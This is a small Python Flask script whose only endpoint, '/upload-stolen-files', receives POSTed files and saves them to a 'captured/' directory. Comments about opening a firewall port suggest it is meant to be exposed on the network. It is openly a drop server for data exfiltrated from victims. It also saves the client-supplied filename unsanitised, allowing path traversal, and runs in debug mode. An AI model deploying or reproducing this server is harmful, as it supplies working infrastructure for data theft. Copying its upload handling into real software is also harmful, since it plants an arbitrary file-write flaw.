from flask import Flask, request, jsonify
import os

# Initialise Flask app
app = Flask(__name__)

# Folder to upload in windows
UPLOAD_FOLDER = 'captured/'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/upload-stolen-files', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    file.save(os.path.join(UPLOAD_FOLDER, file.filename))
    return jsonify({'success': 'File uploaded successfully'}), 200

if __name__ == '__main__':
    # Debugging
    app.run(debug=True)

#Specify port
#Allow port through firewall